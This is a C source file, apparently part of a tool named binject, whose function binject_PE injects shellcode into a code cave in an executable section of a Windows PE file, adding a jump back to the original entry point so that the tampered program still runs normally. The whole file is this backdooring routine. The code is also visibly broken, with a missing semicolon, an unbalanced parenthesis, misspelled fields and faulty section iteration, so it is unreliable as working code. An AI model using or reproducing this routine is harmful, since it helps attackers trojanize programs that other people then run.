#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include  "binject-util.h"
#include  "binject_pe.h"
int binject_PE(char *file,char *shellcode,int method)
{
 uint32_t size,oryginal_entry;
  int i,x;
  FILE *f;
  f=fopen(file,"rw");
  fseek(f,0,SEEK_END);
  int sclen=strlen(shellcode);
  size=ftell(f);
  char *file_buffer = calloc(1,size);
  fseek(f,0,SEEK_SET);
  fread(file_buffer,1,size,f);
	char *address = file_buffer;
  PIMAGE_DOS_HEADER dos = (struct PIMAGE_DOS_HEADER *)address;
	
  if(method==CODE_CAVE)
  {
	  
	address+=dos->e_elfanew
	PIMAGE_NT_HEADERS nt = (struct PIMAGE_NT_HEADERS *)address;
	oryginal_entry=nt->OptionalHeader.AddressOfEntryPoint;
	address+= sizeof(IMAGE_NT_HEADERS);
		for(int i=0;i<nt->FileHeader.NumberOfSections;i++) {
			PIMAGE_SECTION_HEADER section= (struct PIMAGE_SECTION_HEADER*)address;
			if(section->characteristics&pe.IMAGE_SCN_MEM_EXECUTE != 0 { 
				uint32_t section_start=section->PointerToRawData;
				uint32_t section_end=section_start+section->SizeOfRawData;
			        
			        x=find_code_cave(sclen,section_start,section_end,file_buffer);
				if(x!=0)
				{ 
					sclen+=5;
					char *shellcodefixed =ApplySuffixJmpIntel64(shellcode, x,oryginal_entry,0 );
					memcpy(file_buffer+x,shellcodefixed,sclen);
					fseek(f,0,SEEK_SET);
					fwrite(file_buffer,1,size,f);
					free(shellcodefixed);
					free(file_buffer);
					fclose(f);
					return 0;
				}		
						
				                                                   }
			                                               address+=section.SizeOfRawData;
				                                 }
			   free(file_buffer);
			   fclose(f);
			   return -1;
   }
			   
 free(file_buffer);
 fclose(f);
 return -1;
}
